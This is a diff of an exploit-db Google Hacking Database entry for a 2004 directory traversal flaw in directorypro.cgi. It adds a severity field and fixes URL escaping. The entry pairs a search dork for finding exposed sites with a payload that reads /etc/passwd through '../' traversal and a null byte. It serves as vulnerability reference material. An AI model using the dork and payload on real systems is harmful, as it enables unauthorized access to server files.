@@ -1,4 +1,5 @@
 GHDB URL:         https://www.exploit-db.com/ghdb/692
+Severity: 5 
 Category:         Advisories and Vulnerabilities
 Published Date:   2004-11-18
 Author:           anonymous
@@ -6,4 +7,4 @@ GoogleDork:       inurl:directorypro.cgi
 Description:      inurl:directorypro.cgi
 
 
-A security vulnerability in the product allows attackers to perform a directory traversal attack and access files that reside outside the normal HTTP root directory.http://target/cgi-bin/directorypro.cgi?want=showcat&amp;show=../../../../etc/passwd%00http://www.securityfocus.com/bid/2793
+A security vulnerability in the product allows attackers to perform a directory traversal attack and access files that reside outside the normal HTTP root directory.http://target/cgi-bin/directorypro.cgi?want=showcat&show=../../../../etc/passwd%00http://www.securityfocus.com/bid/2793
